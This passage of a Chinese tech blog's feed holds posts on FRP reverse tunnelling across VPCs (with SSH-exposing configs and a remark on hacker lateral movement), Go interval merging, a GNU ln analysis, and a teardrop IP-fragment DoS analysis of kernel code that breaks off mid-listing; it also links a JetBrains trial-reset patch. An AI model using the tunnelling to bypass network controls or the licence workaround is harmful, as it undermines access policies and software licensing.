__cpu_launch, 2.</span><br><span class="line">xby_debug <span class="keyword">in</span> psci_launch_cpu, pa is 0000000040158020.</span><br><span class="line">xby_debug <span class="keyword">in</span> __cpu_launch, 3.</span><br><span class="line">xby_debug <span class="keyword">in</span> psci_launch_cpu, pa is 0000000040158020.</span><br><span class="line">                                                    </span><br><span class="line"><span class="comment">##############################################</span></span><br><span class="line"><span class="comment">#                                            #</span></span><br><span class="line"><span class="comment">#  *   *   ***   *****  ****    ***   *****  #</span></span><br><span class="line"><span class="comment">#  *   *  *   *    *    *   *  *   *    *    #</span></span><br><span class="line"><span class="comment">#  *   *  *   *    *    *   *  *   *    *    #</span></span><br><span class="line"><span class="comment">#  *****  *   *    *    ****   *   *    *    #</span></span><br><span class="line"><span class="comment">#  *   *  *   *    *    *      *   *    *    #</span></span><br><span class="line"><span class="comment">#  *   *  *   *    *    *      *   *    *    #</span></span><br><span class="line"><span class="comment">#  *   *   ***     *    *       ***     *    #</span></span><br><span class="line"><span class="comment">#                                            #</span></span><br><span class="line"><span class="comment">##############################################</span></span><br><span class="line">                                              </span><br><span class="line">[dim-sum@hot pot]<span class="comment"># xby_debug in task2, enter</span></span><br><span class="line">xby_debug <span class="keyword">in</span> task1, enter</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/images/DIM-SUM_shell_ps.png" alt="DIM-SUM_shell_ps.png"></p><blockquote><p>这里是修改过后的代码，将通过creat_process实现执行子命令</p></blockquote><h1 id="展望"><a href="#展望" class="headerlink" title="展望"></a>展望</h1><ul><li>实现sys_wait4回收task_struct等更丰富的接口实现</li><li>支持x86等更丰富的arch</li><li>用户态程序</li><li>理解作者的问题和《答案.docx》</li><li>…</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;DIM-SUM内核学习,先跑起来吧。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="study" scheme="https://embpgp.github.io/categories/study/"/>
    
    
      <category term="DIM-SUM" scheme="https://embpgp.github.io/tags/DIM-SUM/"/>
    
      <category term="OS内核" scheme="https://embpgp.github.io/tags/OS%E5%86%85%E6%A0%B8/"/>
    
  </entry>
  
  <entry>
    <title>VPC网络打通研究</title>
    <link href="https://embpgp.github.io/2021/08/08/VPC%E7%BD%91%E7%BB%9C%E6%89%93%E9%80%9A%E7%A0%94%E7%A9%B6/"/>
    <id>https://embpgp.github.io/2021/08/08/VPC网络打通研究/</id>
    <published>2021-08-08T03:15:28.000Z</published>
    <updated>2025-03-11T12:17:04.190Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>云内网络打通</p></blockquote><span id="more"></span><hr><p><strong>参考资料</strong></p><ul><li><a href="https://gofrp.org/docs/" title="frp">gofrp</a></li><li><a href="https://github.com/ntop/n2n" title="n2n">n2n</a></li><li><a href="https://github.com/ehang-io/nps/blob/master/README_zh.md" title="nps">nps</a></li></ul><hr><h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>在云内多VPC场景下，需要实现多NFV极简+管控+运维+部署。传统的安全管理平台采用平台侧主动推送和纳管NFV组件， 但是在VPC场景下网络打通存在中间的访问控制策略隔离，以及私有网络的暴露面问题。</p><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><ul><li>正向打通：网络往往采用NAT技术或者代理服务器，将内网的服务暴露出来，但是这样的运维成本较大，且存在安全性问题。 采用VPN技术需要两端都外挂前置设备或者软件。</li><li>逆向打通：技术上采用将原本的服务端安装一个client_agent，通过反向的先让client_agent接入原本的客户端的server_proxy， 然后代理程序本身实现IP级别或者PORT级别的隧道数据转发，下面分析逆向打通的几个方案。</li></ul><h1 id="开源方案"><a href="#开源方案" class="headerlink" title="开源方案"></a>开源方案</h1><table><thead><tr><th align="center">技术方案</th><th align="center">优点</th><th align="center">缺点</th></tr></thead><tbody><tr><td align="center">N2N</td><td align="center">功能丰富，满足需求，实现IP2IP级别访问</td><td align="center">采用内核方案，稳定性差</td></tr><tr><td align="center">NPS</td><td align="center">功能丰富，控制面安全性较好</td><td align="center">GPL协议无法商用</td></tr><tr><td align="center">FRP</td><td align="center">功能较丰富，apache协议可以商用</td><td align="center">控制面安全性一般</td></tr></tbody></table><h1 id="FRP方案分析"><a href="#FRP方案分析" class="headerlink" title="FRP方案分析"></a>FRP方案分析</h1><p>为了满足商用需求，可以考虑采用FRP作为VPC网络打通数据面的方案，默认监听7000端口。<br>引入另外的独立的控制面来负责FRP的统一管理/升级维护/横向扩展/高可用等，以满足持续迭代的需求。</p><h1 id="配置方法"><a href="#配置方法" class="headerlink" title="配置方法"></a>配置方法</h1><p>参考<a href="https://gofrp.org/docs/examples/ssh/" title="示例">官网教程</a> 直接配置frpc.ini和frps.ini即可</p><blockquote><p>因此在client上如何管理好frpc.ini是重点.</p></blockquote><p>frps.ini</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">bind_port</span> = <span class="number">7000</span></span><br></pre></td></tr></table></figure><ul><li>可以选择默认启用tls_only选项以及token。</li><li>可以启用服务端插件功能获取frpc的接入上下文来实现访问控制。</li></ul><p>frpc.ini </p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> = x.x.x.x</span><br><span class="line"><span class="attr">server_port</span> = <span class="number">7000</span></span><br><span class="line"></span><br><span class="line"><span class="section">[ssh]</span></span><br><span class="line"><span class="attr">type</span> = tcp</span><br><span class="line"><span class="attr">local_ip</span> = <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line"><span class="attr">local_port</span> = <span class="number">22</span></span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">6000</span></span><br></pre></td></tr></table></figure><p>绝大部分的业务都是tcp。这里可以通过设置local_ip为路由可达的服务器地址，而不仅仅局限于本地通信，因为经常作为hacker的横向扩展工具使用。 具体参考<a href="https://gofrp.org/docs/reference/" title="配置">配置文件</a>。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul><li>多学习开源项目的设计思路</li><li>多看看开源代码的编码风格</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;云内网络打通&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="study" scheme="https://embpgp.github.io/categories/study/"/>
    
    
      <category term="go" scheme="https://embpgp.github.io/tags/go/"/>
    
      <category term="设计" scheme="https://embpgp.github.io/tags/%E8%AE%BE%E8%AE%A1/"/>
    
      <category term="网络" scheme="https://embpgp.github.io/tags/%E7%BD%91%E7%BB%9C/"/>
    
  </entry>
  
  <entry>
    <title>golang init</title>
    <link href="https://embpgp.github.io/2021/07/20/golang-init/"/>
    <id>https://embpgp.github.io/2021/07/20/golang-init/</id>
    <published>2021-07-20T15:10:04.000Z</published>
    <updated>2025-03-11T12:14:38.966Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>拥抱追求高效率生产的云原生时代</p></blockquote><span id="more"></span><hr><p><strong>参考资料</strong> </p><ul><li><a href="https://github.com/unknwon/the-way-to-go_ZH_CN/blob/master/eBook/directory.md" title="go在线教程">go在线教程</a>  </li><li><a href="https://leetcode-cn.com/problems/merge-intervals/solution/go-er-wei-slicepai-xu-by-todayweather/" title="leetcode">leetcode区间合并</a></li></ul><hr><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>此处可以直接搜索网上的教程，建议用goland+插件，可以极大地提高生产效率，试用补丁方案在<a href="https://zhile.io/2020/11/18/jetbrains-eval-reset-da33a93d.html" title="补丁">这里</a>参考。</p><h1 id="小试牛刀"><a href="#小试牛刀" class="headerlink" title="小试牛刀"></a>小试牛刀</h1><blockquote><p>采用leetcode刷题学习，题目是要求合并若干区间数组</p></blockquote><p>以数组 intervals 表示若干个区间的集合，其中单个区间为 intervals[i] = [starti, endi] 。请你合并所有重叠的区间，并返回一个不重叠的区间数组，该数组需恰好覆盖输入中的所有区间。</p><p>这道题在现实情况的工程问题可能对应着需要找出用户配置的IP端，可以合并下发到数据面。</p><h1 id="算法思路"><a href="#算法思路" class="headerlink" title="算法思路"></a>算法思路</h1><blockquote><p>所以解算法题最先要想到如果达到了目标状态，那些数据应该是什么样的</p></blockquote><p>我们用数组 merged 存储最终的答案。<br>首先，我们将列表中的区间按照左端点升序排序。然后我们将第一个区间加入 merged 数组中，并按顺序依次考虑之后的每个区间：<br>如果当前区间的左端点在数组 merged 中最后一个区间的右端点之后，那么它们不会重合，我们可以直接将这个区间加入数组 merged 的末尾；<br>否则，它们重合，我们需要用当前区间的右端点更新数组 merged 中最后一个区间的右端点，将其置为二者的较大值。<br>左端点不需要设置，因为已经排序好了。</p><h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;sort&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">min</span><span class="params">(a, b <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> a &lt; b &#123;</span><br><span class="line"><span class="keyword">return</span> a</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> b</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">max</span><span class="params">(a, b <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> a &lt; b &#123;</span><br><span class="line"><span class="keyword">return</span> b</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Element [][]<span class="keyword">int</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p Element)</span> <span class="title">Swap</span><span class="params">(i, j <span class="keyword">int</span>)</span></span> &#123; p[i], p[j] = p[j], p[i] &#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p Element)</span> <span class="title">Len</span><span class="params">()</span> <span class="title">int</span></span>      &#123; <span class="keyword">return</span> <span class="built_in">len</span>(p) &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断i位置的元素是否比j位置的元素小，如果为真，sort方法会调用swap函数交换</span></span><br><span class="line"><span class="comment">//但是sort函数本身实现是根据从后往前判断的，因此还是默认为升序</span></span><br><span class="line"><span class="comment">//参考sort.sort函数实现的源码</span></span><br><span class="line"><span class="comment">//https://golang.org/src/sort/sort.go</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p Element)</span> <span class="title">Less</span><span class="params">(i, j <span class="keyword">int</span>)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line"><span class="keyword">return</span> p[i][<span class="number">0</span>] &lt; p[j][<span class="number">0</span>]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">leetcode来源：</span></span><br><span class="line"><span class="comment">思路</span></span><br><span class="line"><span class="comment">按照最终的排序状态，肯定是连续的集合</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">merge</span><span class="params">(intervals [][]<span class="keyword">int</span>)</span> [][]<span class="title">int</span></span> &#123;</span><br><span class="line"></span><br><span class="line">ret := <span class="built_in">make</span>([][]<span class="keyword">int</span>, <span class="number">0</span>)</span><br><span class="line">sort.Sort(Element(intervals))</span><br><span class="line">retIndex := <span class="number">0</span></span><br><span class="line">ret = <span class="built_in">append</span>(ret, intervals[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">1</span>; i &lt; <span class="built_in">len</span>(intervals); i++ &#123;</span><br><span class="line"><span class="keyword">if</span> ret[retIndex][<span class="number">1</span>] &lt; intervals[i][<span class="number">0</span>] &#123; <span class="comment">// 当前扫描区间和前一区间不重合，则直接添加到结果中</span></span><br><span class="line">ret = <span class="built_in">append</span>(ret, intervals[i])</span><br><span class="line">retIndex++</span><br><span class="line">&#125; <span class="keyword">else</span> &#123; <span class="comment">// 相邻两个区间重合，则合并成一个区间</span></span><br><span class="line"><span class="comment">//ret[retIndex][0] = min(ret[retIndex][0], intervals[i][0]) //左值已经排序好了</span></span><br><span class="line">ret[retIndex][<span class="number">1</span>] = max(ret[retIndex][<span class="number">1</span>], intervals[i][<span class="number">1</span>])</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ret</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">array := [][]<span class="keyword">int</span>&#123;&#123;<span class="number">1</span>, <span class="number">3</span>&#125;, &#123;<span class="number">2</span>, <span class="number">6</span>&#125;, &#123;<span class="number">8</span>, <span class="number">10</span>&#125;, &#123;<span class="number">15</span>, <span class="number">18</span>&#125;&#125;</span><br><span class="line">out := merge(array)</span><br><span class="line">fmt.Println((out))</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>轮子好啊</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;拥抱追求高效率生产的云原生时代&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="study" scheme="https://embpgp.github.io/categories/study/"/>
    
    
      <category term="go" scheme="https://embpgp.github.io/tags/go/"/>
    
  </entry>
  
  <entry>
    <title>ln -sf target link_name</title>
    <link href="https://embpgp.github.io/2017/12/24/ln-sf-target-link-name/"/>
    <id>https://embpgp.github.io/2017/12/24/ln-sf-target-link-name/</id>
    <published>2017-12-24T14:02:13.000Z</published>
    <updated>2025-03-11T12:14:38.966Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>进程起不来?</p></blockquote><span id="more"></span><hr><h1 id="事因"><a href="#事因" class="headerlink" title="事因"></a>事因</h1><p>Linux下经常会创建软链接来指向真正的路径,特别是Web服务器的配置文件路径.事因是由于在bash脚本中用<code>ln -sf  target_conf_dir new_dir</code>,现象是首次执行的时候会正常创建<code>new_dir</code>,而当<code>new_dir</code>存在的时候,再次执行上述命令现象为在<code>new_dir</code>下新建了一个软链接,名字为<code>target_conf_dir</code>的base_dir,此时若<code>new_dir</code>未指向正确的链接且又用到<code>new_dir</code>的时候,错误就发生了,极有可能导致进程运行失败.</p><h1 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h1><h2 id="down源码"><a href="#down源码" class="headerlink" title="down源码"></a>down源码</h2><p>ln是GNU自带的工具链,因此直接去<a href="http://ftp.gnu.org/gnu/coreutils/">http://ftp.gnu.org/gnu/coreutils/</a>,可下载最新版的<code>coreutils-8.28.tar.xz</code>,解压后进入目录后经典的GNU三段式源码安装程序,即<code>configure-&gt;make-&gt;make install</code>,单独验证程序逻辑仅仅需要前面两步即可.</p><h2 id="大致分析ln实现"><a href="#大致分析ln实现" class="headerlink" title="大致分析ln实现"></a>大致分析ln实现</h2><p>进入src/ln.c,找到main函数,可以看<code>usage</code>函数,其实就是<code>ln --help</code>的输出.由于重点关注<code>-sf</code>参数,因此找到静态变量中对这两个参数相关的<code>remove_existing_files,interactive,symbolic_link</code>,即当<code>-sf</code>加上的时候,三个变量分别是<code>true,false,true</code>.查看代码找到关键几处,一时<code>no_target_directory</code>是否为NULL,暂时不考虑-T和-t参数,因此逻辑走到<code>!target_directory</code>的else if处,在这里将判断目标链接文件是否为目录的问题,如果命令执行的时候不加,则认为是当前目录.下创建,而&gt;2直接认为非法出<code>die</code>了,因此只能等于2,同时短路if语句去执行<code>target_directory_operand</code>函数,这个函数将直接根据是否有属于-n参数很大一部分程度来决定目标<code>target_directory</code>是否为NULL,如果有-n参数,lstat函数将取到链接文件本身,因此每次这个函数返回false,直接导致<code>target_directory</code>指针为NULL,后面将直接执行else语句<code>ok = do_link (file[0], file[1]);</code>去了.如果-n没有置位,则根据stat函数取得链接文件指向的文件看是否为目录.<code>bool is_a_dir = !err &amp;&amp; S_ISDIR (st.st_mode);</code>如果不为目录则也返回false也进入调用者的else逻辑.这些都不会导致’事故’的产生,最常见的是没加-n参数同时链接指向的是一个目录,这个时候就进入if逻辑.由于创建的是软链接,直接定位for循环,个人认为for循环是没必要的,n_files肯定为1,肯定只能执行一次.关键分析<code>file_name_concat</code>函数.</p><h2 id="file-name-concat"><a href="#file-name-concat" class="headerlink" title="file_name_concat"></a>file_name_concat</h2><p>首先调用者传递的参数中第一个是链接文件路径,第二个是取了<code>last_component</code>源文件路径的末尾,即不包括/之前的部分,同时第三个参数暂时没什么用.分析函数逻辑,这个函数主要是拼接路径,通过<code>DBG</code>宏定义打印,此函数将直接返回在链接目录下再生成一个链接文件指向源文件,此时很可能就违背了命令执行者的本意了.如下:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@Rutk1t0r:coreutils-8.28<span class="comment"># src/ln -sf /home/rutk1t0r/ /tmp//test/eee</span></span><br><span class="line">[src/ln.c][533 main]n_files:2</span><br><span class="line">[src/ln.c][559 main]file[n_files -1] = file[1] = /tmp//<span class="built_in">test</span>/eee</span><br><span class="line">[src/ln.c][132 target_directory_operand]err:0</span><br><span class="line">[src/ln.c][134 target_directory_operand]is_a_dir:<span class="literal">true</span></span><br><span class="line">[src/ln.c][579 main]target_dir:/tmp//<span class="built_in">test</span>/eee</span><br><span class="line">[lib/filenamecat-lgpl.c][73 mfile_name_concat][param] dir:/tmp//<span class="built_in">test</span>/eee, abase:rutk1t0r/</span><br><span class="line">[lib/filenamecat-lgpl.c][77 mfile_name_concat]dirbase:eee, dirbaselen:3, dirlen:14, needs_separator:1, base:rutk1t0r/, baselen:9</span><br><span class="line">[lib/filenamecat-lgpl.c][87 mfile_name_concat]ret value:/tmp//<span class="built_in">test</span>/eee/rutk1t0r/ ,base_in_result:rutk1t0r/</span><br><span class="line">[src/ln.c][612 main]file:/home/rutk1t0r/, dest:/tmp//<span class="built_in">test</span>/eee/rutk1t0r</span><br><span class="line">root@Rutk1t0r:coreutils-8.28<span class="comment">#</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>若加上-n参数,则执行如下:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@Rutk1t0r:coreutils-8.28<span class="comment"># src/ln -sfn /home/rutk1t0r/ /tmp//test/eee</span></span><br><span class="line">[src/ln.c][533 main]n_files:2</span><br><span class="line">[src/ln.c][559 main]file[n_files -1] = file[1] = /tmp//<span class="built_in">test</span>/eee</span><br><span class="line">[src/ln.c][132 target_directory_operand]err:0</span><br><span class="line">[src/ln.c][134 target_directory_operand]is_a_dir:<span class="literal">false</span></span><br><span class="line">[src/ln.c][579 main]target_dir:(null)</span><br><span class="line">[src/ln.c][619 main]file[0]:/home/rutk1t0r/, file[1]:/tmp//<span class="built_in">test</span>/eee</span><br><span class="line">root@Rutk1t0r:coreutils-8.28<span class="comment"># </span></span><br></pre></td></tr></table></figure><p>具体更改的代码见<a href="https://github.com/embpgp/gnu_coreutils-8.28">Github:https://github.com/embpgp/gnu_coreutils-8.28</a></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>个人觉得这段代码写得并不怎么样…</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;进程起不来?&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="study" scheme="https://embpgp.github.io/categories/study/"/>
    
    
      <category term="coreutils" scheme="https://embpgp.github.io/tags/coreutils/"/>
    
  </entry>
  
  <entry>
    <title>teardrop分析</title>
    <link href="https://embpgp.github.io/2017/10/18/teardrop%E5%88%86%E6%9E%90/"/>
    <id>https://embpgp.github.io/2017/10/18/teardrop分析/</id>
    <published>2017-10-18T07:13:09.000Z</published>
    <updated>2025-03-11T12:14:38.967Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>按照要求要丢弃掉这种数据包…</p></blockquote><span id="more"></span><hr><p>参考资料:<br><a href="http://blog.csdn.net/opens_tym/article/details/17737419">http://blog.csdn.net/opens_tym/article/details/17737419</a><br><a href="https://segmentfault.com/a/1190000008836467">https://segmentfault.com/a/1190000008836467</a><br><a href="http://zgykill.lofter.com/tag/Linux">http://zgykill.lofter.com/tag/Linux</a><br><a href="https://www.juniper.net/documentation/en_US/junos/topics/concept/denial-of-service-os-teardrop-attack-understanding.html">https://www.juniper.net/documentation/en_US/junos/topics/concept/denial-of-service-os-teardrop-attack-understanding.html</a><br><a href="http://www.nsfocus.net/index.php?act=magazine&do=view&mid=584">http://www.nsfocus.net/index.php?act=magazine&amp;do=view&amp;mid=584</a><br><a href="https://www.samsclass.info/123/proj10/teardrop.htm">https://www.samsclass.info/123/proj10/teardrop.htm</a><br><a href="https://yq.aliyun.com/articles/11345?spm=5176.100239.blogcont11018.9.W7XutP">https://yq.aliyun.com/articles/11345?spm=5176.100239.blogcont11018.9.W7XutP</a></p><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>teardrop主要是利用操作系统协议栈处理IP分片的时候,对于畸形数据包重叠其余分片来使得重组算法发生错误,轻则发生内存泄露重则造成宕机或者拒绝服务.可以参考绿盟分析Linux 2.0内核时期的漏洞原理.而从2.4开始内核就修复了这个漏洞,并尝试如果可能就尽量修复重叠的数据包.具体参见截取部分关键代码(net/ipv4/ip_fragment.c):</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* We found where to put this one.  Check for overlap with</span></span><br><span class="line"><span class="comment"> * preceding fragment, and, if needed, align things so that</span></span><br><span class="line"><span class="comment"> * any overlaps are eliminated.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (prev) &#123;</span><br><span class="line"><span class="keyword">int</span> i = (FRAG_CB(prev)-&gt;offset + prev-&gt;len) - offset;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (i &gt; <span class="number">0</span>) &#123;</span><br><span class="line">offset += i;</span><br><span class="line">err = -EINVAL;</span><br><span class="line"><span class="keyword">if</span> (end &lt;= offset)</span><br><span class="line"><span class="keyword">goto</span> err;</span><br><span class="line">err = -ENOMEM;</span><br><span class="line"><span class="keyword">if</span> (!pskb_pull(skb, i))</span><br><span class="line"><span class="keyword">goto</span> err;</span><br><span class="line"><span class="keyword">if</span> (skb-&gt;ip_summed != CHECKSUM_UNNECESSARY)</span><br><span class="line">skb-&gt;ip_summed = CHECKSUM_NONE;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">err = -ENOMEM;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (next &amp;&amp; FRAG_CB(next)-&gt;offset &lt; end) &#123;</span><br><span class="line"><span class="keyword">int</span> i = end - FRAG_CB(next)-&gt;offset; <span class="comment">/* overlap is &#x27;i&#x27; bytes */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (i &lt; next-&gt;len) &#123;</span><br><span class="line"><span class="comment">/* Eat head of the next overlapped fragment</span></span><br><span class="line"><span class="comment"> * and leave the loop. The next ones cannot overlap.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (!pskb_pull(next, i))</span><br><span class="line"><span class="keyword">goto</span> err;</span><br><span class="line">FRAG_CB(next)-&gt;offset += i;</span><br><span class="line">qp-&gt;q.meat -= i;</span><br><span class="line"><span class="keyword">if</span> (next-&gt;ip_summed != CHECKSUM_UNNECESSARY)</span><br><span class="line">next-&gt;ip_summed = CHECKSUM_NONE;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">struct sk_buff *free_it = next;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Old fragment is completely overridden with</span></span><br><span class="line"><span class="comment"> * new one drop it.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">next = next-&gt;next;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (prev)</span><br><span class="line">prev-&gt;next = next;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">qp-&gt;q.fragments = next;</span><br><span class="line"></span><br><span class="line">qp-&gt;q.meat -= free_it-&gt;len;</span><br><span class="line">frag_kfree_skb(qp-&gt;q.net, free_it, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上述代码就是Linux内核用来尝试修复有重叠的分片,原则是如果跟前一个数据包有重叠,就丢弃掉本分片的重叠部分,而如果跟后面的所有数据包有重叠,就调整后面的分片包,释放或者调整其指针.因此这两处代码就是我们要做文章的地方.</p><h1 id="丢包"><a href="#丢包" class="headerlink" title="丢包"></a>丢包</h1><p>改过之后的代码如下:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span 